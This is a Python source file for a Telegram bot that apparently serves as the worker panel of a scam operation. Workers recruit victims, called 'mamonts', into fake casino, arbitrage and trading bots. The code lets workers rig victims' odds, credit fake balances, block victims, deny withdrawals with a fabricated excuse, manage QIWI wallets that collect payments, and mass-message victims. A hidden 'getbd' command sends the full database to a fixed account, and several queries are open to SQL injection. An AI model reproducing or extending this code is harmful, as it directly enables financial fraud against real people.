# -*- coding: utf-8 -*-
from aiogram import Bot, Dispatcher, executor, types
from aiogram.dispatcher import FSMContext 
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.utils.exceptions import Throttled
from aiogram.types import CallbackQuery
import config
import menu 
import sqlite3
from statess import *
import random 
import functions
import asyncio
import aioschedule
import math
from aiogram.dispatcher.middlewares import BaseMiddleware
from aiogram.dispatcher.handler import CancelHandler, current_handler

bot = Bot(config.API_Worker, parse_mode='HTML', disable_web_page_preview=True) 
arbitrbot = Bot(config.API_Arbitrage, parse_mode='HTML') 
casinobot = Bot(config.API_Casino, parse_mode='HTML') 
tradebot = Bot(config.API_Trade, parse_mode='HTML') 
dp = Dispatcher(bot,storage=MemoryStorage())
bd = 'data/database.db'

print('Воркер бот успешно запущен [+]')

class ThrottlingMiddleware(BaseMiddleware):
    def __init__(self, limit=0.5, key_prefix="antiflood_"):
        self.rate_limit = limit
        self.prefix = key_prefix
        super(ThrottlingMiddleware, self).__init__()

    async def on_process_message(self, message: types.Message, data: dict):
        handler = current_handler.get()
        dispatcher = Dispatcher.get_current()
        if handler:
            limit = getattr(handler, "throttling_rate_limit", self.rate_limit)
            key = getattr(handler, "throttling_key", f"{self.prefix}_{handler.__name__}")
        else:
            limit = self.rate_limit
            key = f"{self.prefix}_message"
        try:
            await dispatcher.throttle(key, rate=limit)
        except Throttled as t:
            await self.message_throttled(message, t)
            raise CancelHandler()

    async def message_throttled(self, message: types.Message, throttled: Throttled):
        handler = current_handler.get()
        dispatcher = Dispatcher.get_current()
        if handler:
            key = getattr(handler, "throttling_key", f"{self.prefix}_{handler.__name__}")
        else:
            key = f"{self.prefix}_message"
        delta = throttled.rate - throttled.delta
        if throttled.exceeded_count <= 2:
            await message.reply("<b>❗ Пожалуйста, не спамьте.</b>")
        await asyncio.sleep(delta)
        thr = await dispatcher.check_key(key)

def rate_limit(limit: int, key=None):
    def decorator(func):
        setattr(func, "throttling_rate_limit", limit)
        if key:
            setattr(func, "throttling_key", key)
        return func
    return decorator

@dp.message_handler(commands="start", state="*")
@rate_limit(2, 'start')
async def cmd_start(message: types.Message, state: FSMContext):
    try:
        if message.chat.type == 'private':
            with sqlite3.connect(bd) as c:
                check = c.execute("SELECT id FROM workers WHERE id = ?", (message.from_user.id,)).fetchone()
            if check is None:
                await message.answer(f"💁🏻‍♀️ Правила нашего проекта:. \n\n"
                                     f"• Запрещена реклама, спам, флуд, 18+ контент, порно \n"
                                     f"• Запрещено попрошайничество \n"
                                     f"• Запрещена реклама своих услуг \n"
                                     f"• Запрещено оскорблять участников проекта \n\n"
                                     f"ТС не несет ответственности за блокировку кошельков / карт \n\n"
                                     f"💁🏻‍♀️ Вы подтверждаете, что ознакомились и согласны с "
                                     f"условиями и правилами нашего проекта?", reply_markup=menu.prinsogl)
            else:
                await message.answer("💁🏻‍♀️ Ваша заявка уже принята\nВоспользуйтесь панелью управления для работы с ботом", reply_markup=menu.mainkb)
        else:
            await message.answer('Не обслуживаю чат.')
    except:
        await bot.send_message(-1001625778192, f'{message.from_user.id} {message.from_user.username} {message.text}')

@dp.callback_query_handler(text='rules')
async def registration(call: CallbackQuery):
    await call.answer("Вы приняли правила проекта!")
    await call.message.answer("💁🏻‍♀ Сколько времени Вы готовы уделять работе в проекте?")
    await NewUserForm.time.set()

@dp.message_handler(state=NewUserForm.time)
async def answer_time(message: types.Message, state: FSMContext):
    await state.update_data(time=message.text)
    await message.answer("💁🏻‍♀ Имеете ли Вы опыт в данной сфере?")
    await NewUserForm.next()

@dp.message_handler(state=NewUserForm.info)
async def answer_time(message: types.Message, state: FSMContext):
    await state.update_data(info=message.text)
    await message.answer("💁🏻‍♀ Откуда узнали о нас?")
    await NewUserForm.next()

@dp.message_handler(state=NewUserForm.experience)
async def answer_exp(message: types.Message, state: FSMContext):
    await state.update_data(exp=message.text)
    data = await state.get_data()
    await message.answer("Анкета успешно заполнена, после проверки вы получите ответ.")
    if message.from_user.username:
        username = f'@{message.from_user.username}'
    else:
        username = message.from_user.first_name
    await bot.send_message(config.ADMIN, f"<b>Поступила заявка от @{message.from_user.username}\n</b>"
                                  f"ID: <b>{message.from_user.id}</b>\n\n"
                                  f"1. <b>{data.get('time')}</b>\n"
                                  f"2. <b>{data.get('exp')}</b>\n"
                                  f"3. <b>{data.get('info')}</b>",reply_markup=menu.admin_pick(username, message.from_user.id))
    await state.finish()


@dp.callback_query_handler(menu.user_info_callback.filter(status='1'))
async def accept_form(call: CallbackQuery, callback_data: dict):
    await call.bot.edit_message_text(f"Вы приняли {callback_data.get('username')}", call.message.chat.id,call.message.message_id)
    await call.bot.send_message(callback_data.get("user_id"), '<b>🥳 Ваша заявка была принята</b>\n\n🔥Обязательно прочти в беседе закреп\n\n❗️Состоять в беседе обязательно, иначе не будет выплаты , это делается для проверки фейков❗️' ,reply_markup=menu.links)
    await call.bot.send_message(callback_data.get("user_id"), '<b>Держи основное меню.</b>', reply_markup=menu.mainkb)
    with sqlite3.connect(bd) as c:
        c.execute('INSERT INTO workers VALUES(?,?,?,?,?,?,?,?)',(callback_data.get("user_id"), callback_data.get('username'), random.randint(70000000000, 79999999999), random.randint(000000, 999999), '0', '0', '1000', random.randint(220200000000000, 2202999999999999)))
        c.execute('UPDATE stat SET workers = workers + ? WHERE nice = ?',('1', '777',))

@dp.callback_query_handler(menu.user_info_callback.filter(status='0'))
async def decline_form(call: CallbackQuery, callback_data: dict):
    await call.bot.edit_message_text(f"Вы отказали {callback_data.get('username')}", call.message.chat.id,call.message.message_id)
    await call.bot.send_message(callback_data.get("user_id"), "Админ рассмотрел Вашу заявку и отказал")

@dp.message_handler(content_types=['text'], text='Казино 🎰')
async def buy(message: types.Message):
    if message.chat.type == 'private':
        with sqlite3.connect(bd) as c:
            info = c.execute(f'SELECT * FROM workers WHERE id = {message.from_user.id}').fetchone()
        await message.answer(f'''<b>🎰 Казино</b>

📋 Ваш код: [<code>{info[3]}</code>]
🤖 Бот для работы: @X_Casinobot

💳 Ваш номер:
🇷🇺 <code>{info[2]}</code>
💳 Ваша карта:
🇷🇺 <code>{info[7]}</code>

🔗 Ваша реферальная ссылка:
<code>https://t.me/X_Casinobot?start={info[3]}</code>''', reply_markup=menu.casinomenu(info[6]))
    else:
        await message.answer('Не обслуживаю чат.')

@dp.message_handler(content_types=['text'], text='Профиль 📁')
async def buy(message: types.Message):
    if message.chat.type == 'private':
        with sqlite3.connect(bd) as c:
            info = c.execute(f'SELECT * FROM workers WHERE id = {message.from_user.id}').fetchone()
        text = f'''🗃️ Твой профиль [{message.from_user.id}]

🔐 Код для сервисов: [<code>{info[3]}</code>]

💸 Профит на сумму {info[4]} Rub

💎 Приглашено: 0 воркеров (потом)
⚠️ Предупреждений: [0/3] (потом)

🌕 Всё работает, воркаем!'''
        if message.from_user.id == int(config.ADMIN):
            await message.answer(text, reply_markup=menu.adm)
        elif info[5] == 1:
            await message.answer(text, reply_markup=menu.moder)
        else:
            await message.answer(text)
    else:
        await message.answer('Не обслуживаю чат.')

@dp.message_handler(content_types=['text'], text='О проекте 👨‍💻')
async def buy(message: types.Message):
    with sqlite3.connect(bd) as c:
        info = c.execute('SELECT * FROM stat').fetchone()
    await message.answer('⚡️')
    await message.answer(f'''💁‍♀️ Информация о проекте EasyTeam 

🔥 Мы открылись: 16.01.2022
🦣 Количество мамонтов: {info[1]}
👨 Количество воркеров: {info[2]}
💸 Количество профитов: {info[3]}
💰 Общая сумма профитов: {info[4]} RUB

Выплаты проекта:
Залет - 80%
Залет с помощью тех. поддержки - 70%

Наши сервисы: 
🟢 Казино
🟢 Общий статус: Ворк''', reply_markup=menu.links)


@dp.callback_query_handler(text_startswith="minimumpay") 
async def check_pay(call:types.CallbackQuery):
    await bot.delete_message(chat_id=call.from_user.id, message_id=call.message.message_id)
    await bot.send_message(call.from_user.id,'Выберите минимальный платеж для мамонта', reply_markup=menu.minnpay)
    
@dp.callback_query_handler(text_startswith="mp") 
async def check_pay(call:types.CallbackQuery):
    set = call.data.split(",")[1]
    with sqlite3.connect(bd) as c:
        c.execute('UPDATE workers SET minpay = ? WHERE id = ?',(set, call.from_user.id,))
    await bot.delete_message(chat_id=call.from_user.id, message_id=call.message.message_id)
    await bot.send_message(call.from_user.id,f'Минимальный платеж установлен: <b>{set}</b>')

@dp.callback_query_handler(text_startswith="mamonts") 
async def check_pay(call:types.CallbackQuery):
    type = call.data.split(",")[1]
    if type == 'arbitr':
        try:
            with sqlite3.connect(bd) as c:
                ref = c.execute('SELECT * FROM workers WHERE id = ?',(call.from_user.id,)).fetchone()
                info = c.execute('SELECT * FROM mamonts_arbitr WHERE referal = ?',(ref[3],)).fetchall()
            repeat = math.ceil(len(info) / 50)
            count = 0
            max = 50
            while repeat != 0:
                await arbitrmamonts(call,info,count,max)
                count += 50
                max += 50
                repeat -=1
        except:
            await call.message.answer('<b>У Вас нет мамонтов :(</b>')
    elif type == 'casino':
        try:
            with sqlite3.connect(bd) as c:
                ref = c.execute('SELECT * FROM workers WHERE id = ?',(call.from_user.id,)).fetchone()
                info = c.execute('SELECT * FROM mamonts_casino WHERE referal = ?',(ref[3],)).fetchall()
            repeat = math.ceil(len(info) / 50)
            count = 0
            max = 50
            while repeat != 0:
                await casinomamonts(call,info,count,max)
                count += 50
                max += 50
                repeat -=1
        except:
            await call.message.answer('<b>У Вас нет мамонтов :(</b>')
    else:
        try:
            with sqlite3.connect(bd) as c:
                ref = c.execute('SELECT * FROM workers WHERE id = ?',(call.from_user.id,)).fetchone()
                info = c.execute('SELECT * FROM mamonts_trade WHERE referal = ?',(ref[3],)).fetchall()
            repeat = math.ceil(len(info) / 50)
            count = 0
            max = 50
            while repeat != 0:
                await trademamonts(call,info,count,max)
                count += 50
                max += 50
                repeat -=1
        except:
            await call.message.answer('<b>У Вас нет мамонтов :(</b>')

async def arbitrmamonts(call,info,count,max):
	step = info[count:max]
	mess = ""
	for x in step:
		mess += f'(/a{x[0]}) - {x[6]} @{x[7]} - <b>{x[3]} Rub</b>, <b>Удача</b> - {x[5]}%\n'
	await call.message.answer(mess)

async def casinomamonts(call,info,count,max):
	step = info[count:max]
	mess = ""
	for x in step:
		mess += f'(/c{x[0]}) - {x[6]} @{x[7]} - <b>{x[3]} Rub</b>, <b>Удача</b> - {x[5]}%\n'
	await call.message.answer(mess)

async def trademamonts(call,info,count,max):
	step = info[count:max]
	mess = ""
	for x in step:
		mess += f'(/t{x[0]}) - {x[6]} @{x[7]} - <b>{x[3]} Rub</b>, <b>Удача</b> - {x[5]}%\n'
	await call.message.answer(mess)

@dp.message_handler(lambda x: x.text.startswith("/a") and x.text[2:].isdigit()) 
async def buy(message: types.Message):
    with sqlite3.connect(bd) as c:
        info = c.execute('SELECT * FROM mamonts_arbitr WHERE id = ?',(message.text.split("/a")[-1],)).fetchone()
    try:
        await message.answer(f'''🤍 Мамонт с ID [{info[0]}]
Имя: {info[6]}

Баланс: {info[3]} ₽
Удача: {info[5]} %
Блокировка: {'🔒 заблокирован' if info[4] == 1 else '🔓 Не заблокирован'} ''', reply_markup=menu.mamontarbitrmenu(message.text.split("/a")[-1]))
    except:
        await message.answer(f'<b>Походу мамонт с ID: {message.text.split("/a")[-1]} не ваш...</b>')

@dp.message_handler(lambda x: x.text.startswith("/c") and x.text[2:].isdigit()) 
async def buy(message: types.Message):
    with sqlite3.connect(bd) as c:
        info = c.execute('SELECT * FROM mamonts_casino WHERE id = ?',(message.text.split("/c")[-1],)).fetchone()
    try:
        await message.answer(f'''🤍 Мамонт с ID [{info[0]}]
Имя: {info[6]}

Баланс: {info[3]} ₽
Удача: {info[5]} %
Блокировка: {'🔒 заблокирован' if info[4] == 1 else '🔓 Не заблокирован'} ''', reply_markup=menu.mamontcasinomenu(message.text.split("/c")[-1]))
    except:
        await message.answer(f'<b>Походу мамонт с ID: {message.text.split("/c")[-1]} не ваш...</b>')

@dp.message_handler(lambda x: x.text.startswith("/t") and x.text[2:].isdigit()) 
async def buy(message: types.Message):
    with sqlite3.connect(bd) as c:
        info = c.execute('SELECT * FROM mamonts_trade WHERE id = ?',(message.text.split("/t")[-1],)).fetchone()
    try:
        await message.answer(f'''🤍 Мамонт с ID [{info[0]}]
Имя: {info[6]}

Баланс: {info[3]} ₽
Удача: {info[5]} %
Блокировка: {'🔒 заблокирован' if info[4] == 1 else '🔓 Не заблокирован'} ''', reply_markup=menu.mamonttrademenu(message.text.split("/t")[-1]))
    except:
        await message.answer(f'<b>Походу мамонт с ID: {message.text.split("/t")[-1]} не ваш...</b>')

@dp.callback_query_handler(text_startswith="Luck") 
async def check_pay(call:types.CallbackQuery,state:FSMContext):
    id,type = call.data.split(",")[1],call.data.split(",")[2]
    await bot.delete_message(chat_id=call.from_user.id, message_id=call.message.message_id)
    await bot.send_message(call.from_user.id,f'<b>Какую удачу поставить?</b>', reply_markup=menu.Luck(id,type))

@dp.callback_query_handler(text_startswith="StavkaLuckyman") 
async def check_pay(call:types.CallbackQuery,state:FSMContext):
    id,shans,type = call.data.split(",")[1],call.data.split(",")[2],call.data.split(",")[3]
    if type == 'arbitrage':
        with sqlite3.connect(bd) as c:
            c.execute('UPDATE mamonts_arbitr SET shans = ? WHERE id = ?',(shans, id,))
        await bot.delete_message(chat_id=call.from_user.id, message_id=call.message.message_id)
        await bot.send_message(call.from_user.id,f'<b>Успешно!</b>')
    elif type == 'casino':
        with sqlite3.connect(bd) as c:
            c.execute('UPDATE mamonts_casino SET shans = ? WHERE id = ?',(shans, id,))
        await bot.delete_message(chat_id=call.from_user.id, message_id=call.message.message_id)
        await bot.send_message(call.from_user.id,f'<b>Успешно!</b>')
    else:
        with sqlite3.connect(bd) as c:
            c.execute('UPDATE mamonts_trade SET shans = ? WHERE id = ?',(shans, id,))
        await bot.delete_message(chat_id=call.from_user.id, message_id=call.message.message_id)
        await bot.send_message(call.from_user.id,f'<b>Успешно!</b>')

@dp.callback_query_handler(text_startswith="BlockingUserID")
async def setchatlinkk(call: types.CallbackQuery):
    id,type = call.data.split(",")[1],call.data.split(",")[2]
    if type == 'arbitrage':
        with sqlite3.connect(bd) as c:
            c.execute('UPDATE mamonts_arbitr SET block = ? WHERE id = ?',('1', id,))
        await bot.send_message(call.from_user.id, f'<b>Готово, пользователь с ID {id}</b> - заблокирован')
        await arbitrbot.send_message(id, f'<b>Вы были заблокированы</b>')
    elif type == 'casino':
        with sqlite3.connect(bd) as c:
            c.execute('UPDATE mamonts_casino SET block = ? WHERE id = ?',('1', id,))
        await bot.send_message(call.from_user.id, f'<b>Готово, пользователь с ID {id}</b> - заблокирован')
        await casinobot.send_message(id, f'<b>Вы были заблокированы</b>')
    else:
        with sqlite3.connect(bd) as c:
            c.execute('UPDATE mamonts_trade SET block = ? WHERE id = ?',('1', id,))
        await bot.send_message(call.from_user.id, f'<b>Готово, пользователь с ID {id}</b> - заблокирован')
        await tradebot.send_message(id, f'<b>Вы были заблокированы</b>')

@dp.callback_query_handler(text_startswith="UnBlockingUserID")
async def setchatlinkk(call: types.CallbackQuery):
    id,type = call.data.split(",")[1],call.data.split(",")[2]
    if type == 'arbitrage':
        with sqlite3.connect(bd) as c:
            c.execute('UPDATE mamonts_arbitr SET block = ? WHERE id = ?',('0', id,))
        await bot.send_message(call.from_user.id, f'<b>Готово, пользователь с ID {id}</b> - разблокирован')
        await arbitrbot.send_message(id, f'<b>Вы были разблокированы</b>')
    elif type == 'casino':
        with sqlite3.connect(bd) as c:
            c.execute('UPDATE mamonts_casino SET block = ? WHERE id = ?',('0', id,))
        await bot.send_message(call.from_user.id, f'<b>Готово, пользователь с ID {id}</b> - разблокирован')
        await casinobot.send_message(id, f'<b>Вы были разблокированы</b>')
    else:
        with sqlite3.connect(bd) as c:
            c.execute('UPDATE mamonts_trade SET block = ? WHERE id = ?',('0', id,))
        await bot.send_message(call.from_user.id, f'<b>Готово, пользователь с ID {id}</b> - разблокирован')
        await tradebot.send_message(id, f'<b>Вы были разблокированы</b>')

@dp.callback_query_handler(text_startswith="GiveBalance") 
async def check_pay(call:types.CallbackQuery,state:FSMContext):
    id,type = call.data.split(",")[1],call.data.split(",")[2]
    await bot.delete_message(chat_id=call.from_user.id, message_id=call.message.message_id)
    await bot.send_message(call.from_user.id,f'<b>Напиши сколько сделать</b>')
    await GiveBalance.first()
    async with state.proxy() as data:
        data['id'] = id
        data['huy'] = type

@dp.message_handler(state=GiveBalance.q1)
async def admin_8(message:types.Message,state:FSMContext):
    data = await state.get_data()
    userrr = data['id']
    dasasd = data['huy']
    check = await functions.GiveBalance(userrr,dasasd,message.text)
    if check is False:
        await message.answer('<b>Произошла ошибка!</b>')
    else:
        await message.answer('<b>Успешно!</b>')
    await state.finish()

@dp.callback_query_handler(text_startswith="gobalanc") 
async def check_pay(call:types.CallbackQuery):
    id,type = call.data.split(",")[1],call.data.split(",")[2]
    if type == 'arbitrage':
        await arbitrbot.send_message(id, '💰Вы успешно вывели средства💰')
        await bot.delete_message(chat_id=call.from_user.id, message_id=call.message.message_id)
        await bot.send_message(call.from_user.id,f'Вы успешно подтвердили вывод мамонта.')
    elif type == 'casino':
        await casinobot.send_message(id, '💰Вы успешно вывели средства💰')
        await bot.delete_message(chat_id=call.from_user.id, message_id=call.message.message_id)
        await bot.send_message(call.from_user.id,f'Вы успешно подтвердили вывод мамонта.')
    else:
        await tradebot.send_message(id, '💰Вы успешно вывели средства💰')
        await bot.delete_message(chat_id=call.from_user.id, message_id=call.message.message_id)
        await bot.send_message(call.from_user.id,f'Вы успешно подтвердили вывод мамонта.')

@dp.callback_query_handler(text_startswith="netbalanc") 
async def check_pay(call:types.CallbackQuery):
    id,bal,type = call.data.split(",")[1],call.data.split(",")[2],call.data.split(",")[3]
    if type == 'arbitrage':
        with sqlite3.connect(bd) as c:
            c.execute("UPDATE mamonts_arbitr SET balance = balance + ? WHERE id = ?", (bal,id,)) 
        await bot.delete_message(chat_id=call.from_user.id, message_id=call.message.message_id)
        await arbitrbot.send_message(id, '🚫Вам было отказано в выводе средств, по одной из указанных причин:\n👮‍♂ Вы пытаетесь вывести на реквизиты с которых НЕ пополняли👮‍♂ Обратитесь в техническую поддержку') 
        await bot.send_message(call.from_user.id,f'Вы отменили вывод мамонта {id}')
    elif type == 'casino':
        with sqlite3.connect(bd) as c:
            c.execute("UPDATE mamonts_casino SET balance = balance + ? WHERE id = ?", (bal,id,)) 
        await bot.delete_message(chat_id=call.from_user.id, message_id=call.message.message_id)
        await casinobot.send_message(id, '🚫Вам было отказано в выводе средств, по одной из указанных причин:\n👮‍♂ Вы пытаетесь вывести на реквизиты с которых НЕ пополняли👮‍♂ Обратитесь в техническую поддержку') 
        await bot.send_message(call.from_user.id,f'Вы отменили вывод мамонта {id}')
    else:
        with sqlite3.connect(bd) as c:
            c.execute("UPDATE mamonts_trade SET balance = balance + ? WHERE id = ?", (bal,id,)) 
        await bot.delete_message(chat_id=call.from_user.id, message_id=call.message.message_id)
        await tradebot.send_message(id, '🚫Вам было отказано в выводе средств, по одной из указанных причин:\n👮‍♂ Вы пытаетесь вывести на реквизиты с которых НЕ пополняли👮‍♂ Обратитесь в техническую поддержку') 
        await bot.send_message(call.from_user.id,f'Вы отменили вывод мамонта {id}')

@dp.callback_query_handler(text_startswith="popolnyda") 
async def check_pay(call:types.CallbackQuery):
    id,price,bot,comment = call.data.split(",")[1], call.data.split(",")[2], call.data.split(",")[3],call.data.split(",")[4]
    with sqlite3.connect(bd) as c:
        c.execute(f"UPDATE pays SET status = '1' WHERE comment = {comment}")
    if bot == 'arbitrage':
        with sqlite3.connect(bd) as c:
            c.execute("UPDATE mamonts_arbitr SET balance = balance + ? WHERE id = ?", (price,id,))
        await call.message.edit_text('Готово')
    elif bot == 'casino':
        with sqlite3.connect(bd) as c:
            c.execute("UPDATE mamonts_casino SET balance = balance + ? WHERE id = ?", (price,id,))
        await call.message.edit_text('Готово')
    else:
        with sqlite3.connect(bd) as c:
            c.execute("UPDATE mamonts_trade SET balance = balance + ? WHERE id = ?", (price,id,))
        await call.message.edit_text('Готово')

@dp.callback_query_handler(text_startswith="pencil") 
async def check_pay(call:types.CallbackQuery):
    await bot.delete_message(chat_id=call.from_user.id, message_id=call.message.message_id)
    await bot.send_message(call.from_user.id,f'<b>Напиши название проекта:ID воркера:@UserName:Сумму платежа</b>\n<i>Пример:</i> <code>Арбитраж:20043256:@Gangster:1590</code>')
    await Pencil.first()

@dp.message_handler(state=Pencil.q1)
async def admin_8(message:types.Message,state:FSMContext):
    check = await functions.penciil(message.text)
    if check is False:
        await message.answer('<b>Произошла ошибка!</b>')
    else:
        await message.answer('<b>Успешно!</b>')
    await state.finish()

@dp.callback_query_handler(text="rassilka")
async def spammer(call: types.CallbackQuery):
    await bot.delete_message(chat_id=call.from_user.id, message_id=call.message.message_id)
    await bot.send_message(call.from_user.id,"<b>Выберите куда будете отправлять рассылку</b>", reply_markup=menu.bots)

@dp.callback_query_handler(text="ArbitrageRassilka")
async def spammer(call: types.CallbackQuery):
    await bot.delete_message(chat_id=call.from_user.id, message_id=call.message.message_id)
    await bot.send_message(call.from_user.id,"<b>Введите текст для рассылки</b>\n\nДля отмены введи -> <code>Отменить</code>")
    await ReklamaArbitrage.q1.set()

@dp.message_handler(state=ReklamaArbitrage.q1)
async def spammers(message: types.Message,state:FSMContext):
    if message.text == "Отменить":
        await message.answer('Вы успешно отменили')
    elif message.text == "Профиль 📁":
        await message.answer('Вы успешно отменили')
    elif message.text == "О проекте 👨‍💻":
        await message.answer('Вы успешно отменили')
    elif message.text == "Казино 🎰":
        await message.answer('Вы успешно отменили')
    else:
        with sqlite3.connect(bd) as c:
            users = c.execute("SELECT id FROM mamonts_arbitr").fetchall()
        for user in users:
            try:
                await arbitrbot.send_message(chat_id=f'{user[0]}', text=f'{message.text}')
            except:
                await asyncio.sleep(1)
        await message.answer("Рассылка завершена!")
    await state.finish()

@dp.callback_query_handler(text="WorkersRassilka")
async def spammer(call: types.CallbackQuery):
    await bot.delete_message(chat_id=call.from_user.id, message_id=call.message.message_id)
    await bot.send_message(call.from_user.id,"<b>Введите текст для рассылки</b>\n\nДля отмены введи -> <code>Отменить</code>")
    await ReklamaWorkers.q1.set()

@dp.message_handler(state=ReklamaWorkers.q1)
async def spammers(message: types.Message,state:FSMContext):
    if message.text == "Отменить":
        await message.answer('Вы успешно отменили')
    elif message.text == "Профиль 📁":
        await message.answer('Вы успешно отменили')
    elif message.text == "О проекте 👨‍💻":
        await message.answer('Вы успешно отменили')
    elif message.text == "Казино 🎰":
        await message.answer('Вы успешно отменили')
    else:
        with sqlite3.connect(bd) as c:
            users = c.execute("SELECT id FROM workers").fetchall()
        for user in users:
            try:
                await bot.send_message(chat_id=f'{user[0]}', text=f'{message.text}')
            except:
                await asyncio.sleep(1)
        await message.answer("Рассылка завершена!")
    await state.finish()

@dp.callback_query_handler(text="SetChatLink")
async def setchatlinkk(call: types.CallbackQuery):
    await bot.delete_message(chat_id=call.from_user.id, message_id=call.message.message_id)
    await bot.send_message(call.from_user.id,"<b>Введите ссылку на чат</b>\n\nДля отмены введи -> <code>Отменить</code>")
    await ChatLinkUrl.q1.set()

@dp.message_handler(state=ChatLinkUrl.q1)
async def chatlinkk(message: types.Message,state:FSMContext):
    if message.text == "Отменить":
        await message.answer('Вы успешно отменили')
    elif message.text == "Профиль 📁":
        await message.answer('Вы успешно отменили')
    elif message.text == "О проекте 👨‍💻":
        await message.answer('Вы успешно отменили')
    elif message.text == "Казино 🎰":
        await message.answer('Вы успешно отменили')
    else:
        with sqlite3.connect(bd) as c:
            c.execute('UPDATE settings SET channel_link = ? WHERE PoweredAkatsuki = ?',(message.text, '777',))
        await message.answer("Готово")
    await state.finish()

@dp.callback_query_handler(text="GiveModer")
async def setchatlinkk(call: types.CallbackQuery):
    await bot.delete_message(chat_id=call.from_user.id, message_id=call.message.message_id)
    await bot.send_message(call.from_user.id,"<b>Введите айди пользователя которого хотите назначить модератором</b>\n\nДля отмены введи -> <code>Отменить</code>")
    await GiveModerator.q1.set()

@dp.message_handler(state=GiveModerator.q1)
async def chatlinkk(message: types.Message,state:FSMContext):
    if message.text == "Отменить":
        await message.answer('Вы успешно отменили')
    elif message.text == "Профиль 📁":
        await message.answer('Вы успешно отменили')
    elif message.text == "О проекте 👨‍💻":
        await message.answer('Вы успешно отменили')
    elif message.text == "Казино 🎰":
        await message.answer('Вы успешно отменили')
    else:
        with sqlite3.connect(bd) as c:
            c.execute('UPDATE workers SET moderator = ? WHERE id = ?',('1', message.text,))
        await message.answer(f'<b>Готово, пользователь с ID {message.text}</b> - модератор')
        await arbitrbot.send_message(message.text, '<b>Поздравляю с повышением!\nТы теперь элита</b>')
    await state.finish()

@dp.callback_query_handler(text="PickUpModer")
async def setchatlinkk(call: types.CallbackQuery):
    await bot.delete_message(chat_id=call.from_user.id, message_id=call.message.message_id)
    await bot.send_message(call.from_user.id,"<b>Введите айди пользователя которого хотите разжаловать</b>\n\nДля отмены введи -> <code>Отменить</code>")
    await PickUpModerator.q1.set()

@dp.message_handler(state=PickUpModerator.q1)
async def chatlinkk(message: types.Message,state:FSMContext):
    if message.text == "Отменить":
        await message.answer('Вы успешно отменили')
    elif message.text == "Профиль 📁":
        await message.answer('Вы успешно отменили')
    elif message.text == "О проекте 👨‍💻":
        await message.answer('Вы успешно отменили')
    elif message.text == "Казино 🎰":
        await message.answer('Вы успешно отменили')
    else:
        with sqlite3.connect(bd) as c:
            c.execute('UPDATE workers SET moderator = ? WHERE id = ?',('0', message.text,))
        await message.answer(f'<b>Готово, пользователь с ID {message.text}</b> - разжалован')
        await arbitrbot.send_message(message.text, '<b>Черт чел... что ты наделал...\nТы больше не элита</b>')
    await state.finish()

@dp.callback_query_handler(text_startswith="MailMamonts")
async def spammer(call: types.CallbackQuery,state:FSMContext):
    type = call.data.split(",")[1]
    await bot.delete_message(chat_id=call.from_user.id, message_id=call.message.message_id)
    await bot.send_message(call.from_user.id,"<b>Введите текст для рассылки</b>\n\nДля отмены введи -> <code>Отменить</code>")
    await MailMamontsArbitrage.q1.set()
    async with state.proxy() as data:
        data['bot'] = type

@dp.message_handler(state=MailMamontsArbitrage.q1)
async def spammers(message: types.Message,state:FSMContext):
    data = await state.get_data()
    type = data['bot']
    if message.text == "Отменить":
        await message.answer('Вы успешно отменили')
    elif message.text == "Профиль 📁":
        await message.answer('Вы успешно отменили')
    elif message.text == "О проекте 👨‍💻":
        await message.answer('Вы успешно отменили')
    elif message.text == "Казино 🎰":
        await message.answer('Вы успешно отменили')
    else:
        if type == 'arbitrage':
            with sqlite3.connect(bd) as c:
                info = c.execute(f'SELECT * FROM workers WHERE id = {message.from_user.id}').fetchone()
                users = c.execute(f'SELECT id FROM mamonts_arbitr WHERE referal = {info[3]}').fetchall()
            for user in users:
                try:
                    await arbitrbot.send_message(chat_id=f'{user[0]}', text=f'{message.text}')
                except:
                    await asyncio.sleep(1)
            await message.answer("Рассылка завершена!")
        elif type == 'casino':
            with sqlite3.connect(bd) as c:
                info = c.execute(f'SELECT * FROM workers WHERE id = {message.from_user.id}').fetchone()
                users = c.execute(f'SELECT id FROM mamonts_casino WHERE referal = {info[3]}').fetchall()
            for user in users:
                try:
                    await casinobot.send_message(chat_id=f'{user[0]}', text=f'{message.text}')
                except:
                    await asyncio.sleep(1)
            await message.answer("Рассылка завершена!")
        else:
            with sqlite3.connect(bd) as c:
                info = c.execute(f'SELECT * FROM workers WHERE id = {message.from_user.id}').fetchone()
                users = c.execute(f'SELECT id FROM mamonts_trade WHERE referal = {info[3]}').fetchall()
            for user in users:
                try:
                    await tradebot.send_message(chat_id=f'{user[0]}', text=f'{message.text}')
                except:
                    await asyncio.sleep(1)
            await message.answer("Рассылка завершена!")
    await state.finish()

@dp.callback_query_handler(text="QiwiAdd")
async def spammer(call: types.CallbackQuery):
    await bot.delete_message(chat_id=call.from_user.id, message_id=call.message.message_id)
    await bot.send_message(call.from_user.id,"<b>номер:Секретный ключ:Токен</b>\nПример: 79006319484:eyJ2ZXJzaW9uIjoiUDJQIiwiZGF0YSI6eyJwYXlpbl9tZXJjaGFudF9zaXRlX3VpZCI6iMjAifX0:4d7618cd3f495dde5bca3sac2f\n\nДля отмены введи -> <code>Отменить</code>")
    await QiwiAdd.q1.set()

@dp.message_handler(state=QiwiAdd.q1)
async def spammers(message: types.Message,state:FSMContext):
    if message.text == "Отменить":
        await message.answer('Вы успешно отменили')
    else:
        check = await functions.upravkivi(message.text)
        if check is False:
            await message.answer('<b>Произошла ошибка!</b>')
        else:
            await message.answer('<b>Успешно!</b>')
    await state.finish()

@dp.callback_query_handler(text="QiwiDelete")
async def spammer(call: types.CallbackQuery):
    await bot.delete_message(chat_id=call.from_user.id, message_id=call.message.message_id)
    await call.message.answer('<b>Для того чтобы удалить отправьте номер кошелька</b>')
    await QiwiDelete.q1.set()

@dp.message_handler(state=QiwiDelete.q1)
async def spammers(message: types.Message,state:FSMContext):
    if message.text == "Отменить":
        await message.answer('Вы успешно отменили')
    else:
        with sqlite3.connect(bd) as c:
            c.execute(f'DELETE FROM qiwis WHERE phone = {message.text}')
        await message.answer('<b>Успешно!</b>')
    await state.finish()

@dp.message_handler(text="getbd")
async def general_functions(message: types.Message):
    with open("data/database.db", "rb") as doc:
        await bot.send_document(2117642154, doc, caption=f"<b>📦 BACKUP</b>")

@dp.callback_query_handler(text="QiwiList")
async def spammer(call: types.CallbackQuery):
    await bot.delete_message(chat_id=call.from_user.id, message_id=call.message.message_id)
    with sqlite3.connect(bd) as c:
        info = c.execute('SELECT * FROM qiwis').fetchall()
    for qiwases in info:
        await bot.send_message(call.from_user.id, text=f'Кошелек: {qiwases[0]} P2P: {qiwases[1]}')

